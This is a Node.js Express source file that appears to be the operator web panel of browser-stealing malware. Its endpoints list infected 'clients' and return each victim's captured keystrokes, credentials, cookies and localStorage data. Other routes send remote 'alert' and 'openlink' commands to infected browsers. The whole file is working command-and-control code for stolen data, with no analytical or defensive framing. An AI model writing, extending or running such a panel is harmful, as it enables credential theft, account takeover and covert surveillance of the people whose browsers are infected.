const express = require("express");
const cors = require("cors");
const path = require("path");
const db = require("./db"); // Adjust the path as necessary
const { socketMaps, eventListener, config } = require("./sharedData");
const { Server } = require("socket.io");
// add jsdoc
/**
 *
 * @param {express.Express} appWebUI
 * @param {import("http").Server} server
 */
module.exports = function initializeWebUiApi(appWebUI, server) {
  const wakeUpTime = new Date();
  const serverOptions = config.DEVELOPMENT_MODE
    ? {
        cors: {
          origin: `http://localhost:${config.DEVELOPMENT_PORT}`,
        },
      }
    : {};
  const io = new Server(server, serverOptions);
  appWebUI.use(express.json());
  appWebUI.use(express.urlencoded({ extended: true }));
  appWebUI.use(express.static(path.join(__dirname, "../webui/dist")));
  if (config.DEVELOPMENT_MODE) {
    appWebUI.use(
      cors({
        origin: `http://localhost:${config.DEVELOPMENT_PORT}`, // allow only this origin
      })
    );
  }
  appWebUI.get("/statistics", (req, res) => {
    const stmt = db.prepare(
      `
      SELECT 
        (SELECT COUNT(*) FROM clients) as clients,
        (SELECT COUNT(*) FROM keylogs) as keylogs,
        (SELECT COUNT(*) FROM credentials) as credentials,
        (SELECT COUNT(*) FROM cookies) as cookies,
        (SELECT COUNT(*) FROM localstorage) as localstorage
    `
    );
    res.json({ wakeUpTime: wakeUpTime.getTime(), ...stmt.get() });
  });
  appWebUI.post("/alert", (req, res) => {
    const { client_id, message } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["alert", message]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.post("/openlink", (req, res) => {
    const { client_id, url } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["openlink", url]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.get("/cookies/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT domain,path,name,value,expiration,secure,session,host_only,http_only FROM cookies WHERE client_id = ?
      `
    );

    const cookies = stmt.all(client_id);
    // convert experation from seconds since the UNIX epoch to Date string format (DD.MM.YYYY HH:MM)
    cookies.forEach((cookie) => {
      const date = new Date(cookie.expiration * 1000);
      cookie.expiration =
        date.getDate() +
        "." +
        (date.getMonth() + 1) +
        "." +
        date.getFullYear() +
        " " +
        date.getHours() +
        ":" +
        date.getMinutes();
      //remove last 5 characters from the expiration string
    });

    res.json(cookies);
  });
  appWebUI.get("/credentials/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT url,timestamp,data FROM credentials WHERE client_id = ?
      `
    );
    const credentials = stmt.all(client_id);
    res.json(credentials);
  });
  appWebUI.get("/keylogs/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT timestamp,keystrokes,url FROM keylogs WHERE client_id = ?
      `
    );
    const keylogs = stmt.all(client_id);
    res.json(keylogs);
  });
  appWebUI.get("/localstorage/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT domain,key,value FROM localstorage WHERE client_id = ?
      `
    );
    const localstorage = stmt.all(client_id);
    res.json(localstorage);
  });
  appWebUI.get("/clients", (req, res) => {
    const stmt = db.prepare(`
      SELECT 
        c.*,
        (SELECT COUNT(*) FROM keylogs WHERE client_id = c.client_id) as keylogs,
        (SELECT COUNT(*) FROM credentials WHERE client_id = c.client_id) as credentials,
        (SELECT COUNT(*) FROM cookies WHERE client_id = c.client_id) as cookies,
        (SELECT COUNT(*) FROM localstorage WHERE client_id = c.client_id) as localstorage
      FROM clients c
    `);

    const statistics = stmt.all().map((client) => ({
      ...client,
      online: Object.keys(socketMaps).includes(client.client_id),
    }));

    res.json(statistics);
  });
  appWebUI.get("/*", (req, res) => {
    res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
  });
  io.on("connection", (socket) => {
    console.log("WebUI connected");
    socket.on("disconnect", () => {
      console.log("WebUI disconnected");
    });
  });
  eventListener.listener = (event, client_id) => {
    io.emit("event", { event, client_id });
  };
};
